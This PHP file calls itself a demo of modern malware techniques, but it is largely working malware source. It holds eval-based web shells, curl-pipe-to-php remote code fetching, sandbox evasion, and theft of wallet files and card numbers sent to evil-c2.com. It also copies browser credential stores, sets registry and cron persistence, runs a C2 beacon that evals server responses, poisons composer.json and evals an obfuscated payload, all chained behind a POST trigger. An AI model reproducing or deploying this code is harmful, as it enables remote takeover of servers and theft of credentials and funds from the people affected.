<?php
// Demo file: Modern malware techniques
// Demonstrates contemporary attack vectors and evasion techniques

// 1. Fileless malware simulation
$memory_payload = base64_decode('ZXZhbCgkX1BPU1RbJ2NtZCddKTs=');
eval($memory_payload); // Executes without writing to disk

// 2. Living off the land - using legitimate tools
if (isset($_GET['curl_cmd'])) {
    $cmd = "curl -s " . $_GET['curl_cmd'] . " | php";
    shell_exec($cmd);
}

// 3. Polyglot file (valid PHP and other formats)
/*
GIF89a
<?php
*/
if (isset($_POST['polyglot'])) {
    eval($_POST['polyglot']);
}

// 4. Environment-aware malware
function is_sandbox() {
    // Check for sandbox indicators
    $indicators = [
        'COMPUTERNAME' => ['SANDBOX', 'MALWARE', 'VIRUS'],
        'USERNAME' => ['analyst', 'researcher', 'sandbox'],
        'PROCESSOR_IDENTIFIER' => ['QEMU', 'VirtualBox']
    ];
    
    foreach ($indicators as $env_var => $values) {
        $env_value = getenv($env_var);
        foreach ($values as $indicator) {
            if (stripos($env_value, $indicator) !== false) {
                return true;
            }
        }
    }
    return false;
}

if (!is_sandbox()) {
    // Only execute if not in sandbox
    eval($_POST['payload'] ?? '');
}

// 5. Process hollowing simulation
function process_hollow($target_process, $malicious_code) {
    // Simulate process hollowing technique
    $encoded = base64_encode($malicious_code);
    shell_exec("echo '$encoded' | base64 -d | $target_process");
}

// 6. DLL side-loading simulation
if (file_exists('legitimate_app.exe') && file_exists('malicious.dll')) {
    // Simulate DLL side-loading
    exec('legitimate_app.exe'); // Will load malicious.dll
}

// 7. Cryptocurrency stealer
function steal_crypto_wallets() {
    $wallet_paths = [
        '~/.bitcoin/wallet.dat',
        '~/.ethereum/keystore/',
        '~/.monero/',
        '%APPDATA%/Electrum/wallets/'
    ];
    
    foreach ($wallet_paths as $path) {
        if (is_readable($path)) {
            // Exfiltrate wallet files
            $data = file_get_contents($path);
            file_get_contents('http://evil-c2.com/wallet?' . urlencode($data));
        }
    }
}

// 8. Persistence mechanism
function establish_persistence() {
    // Registry persistence (Windows)
    if (PHP_OS_FAMILY === 'Windows') {
        $script_path = __FILE__;
        exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /d \"php $script_path\" /f");
    }
    
    // Cron persistence (Linux)
    if (PHP_OS_FAMILY === 'Linux') {
        $cron_entry = "0 */1 * * * php " . __FILE__;
        exec("(crontab -l; echo '$cron_entry') | crontab -");
    }
}

// 9. Anti-debugging techniques
function anti_debug() {
    $start_time = microtime(true);
    sleep(1);
    $end_time = microtime(true);
    
    // If execution was too fast, likely debugged
    if (($end_time - $start_time) < 0.9) {
        exit("Debug detected");
    }
}

// 10. Network beacon
function beacon_home() {
    $c2_servers = [
        'https://legitimate-looking-domain.com/api/health',
        'https://cdn.example.com/js/analytics.js',
        'https://fonts.googleapis.com/css?family=OpenSans'
    ];
    
    foreach ($c2_servers as $server) {
        $response = @file_get_contents($server . '?id=' . gethostname());
        if ($response) {
            eval(base64_decode($response));
            break;
        }
    }
}

// 11. Browser credential harvesting
function harvest_browser_data() {
    $chrome_path = getenv('LOCALAPPDATA') . '/Google/Chrome/User Data/Default/Login Data';
    $firefox_path = getenv('APPDATA') . '/Mozilla/Firefox/Profiles/';
    
    if (file_exists($chrome_path)) {
        copy($chrome_path, '/tmp/chrome_creds.db');
    }
    
    if (is_dir($firefox_path)) {
        $profiles = glob($firefox_path . '*.default*');
        foreach ($profiles as $profile) {
            $creds = $profile . '/logins.json';
            if (file_exists($creds)) {
                copy($creds, '/tmp/firefox_creds.json');
            }
        }
    }
}

// 12. Rootkit-like behavior
function hide_process() {
    // Attempt to hide from process lists
    if (function_exists('proc_open')) {
        $cmd = 'php -r "while(1) { usleep(100000); }"';
        proc_open($cmd, [], $pipes, null, null, ['bypass_shell' => true]);
    }
}

// 13. Memory scraping
function scrape_memory() {
    // Simulate memory scraping for sensitive data
    $memory_dumps = glob('/proc/*/mem');
    foreach ($memory_dumps as $dump) {
        if (is_readable($dump)) {
            $data = file_get_contents($dump, false, null, 0, 1024);
            if (preg_match('/\d{4}-\d{4}-\d{4}-\d{4}/', $data, $matches)) {
                // Found potential credit card
                file_get_contents('http://evil-c2.com/cc?' . urlencode($matches[0]));
            }
        }
    }
}

// 14. Supply chain attack simulation
function poison_composer() {
    $composer_json = 'composer.json';
    if (file_exists($composer_json)) {
        $config = json_decode(file_get_contents($composer_json), true);
        $config['require']['malicious/package'] = '^1.0';
        file_put_contents($composer_json, json_encode($config, JSON_PRETTY_PRINT));
    }
}

// 15. Advanced obfuscation
$obfuscated = gzinflate(base64_decode('eJxLtDJQUkorys9VqCgpTUlNLinKTFELzy/KSanlquDEJu7F4YTNhF3rPZYNGvgHAA=='));
eval($obfuscated);

// 16. Trigger execution
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['activate'])) {
    anti_debug();
    beacon_home();
    establish_persistence();
    steal_crypto_wallets();
    harvest_browser_data();
    hide_process();
}
?>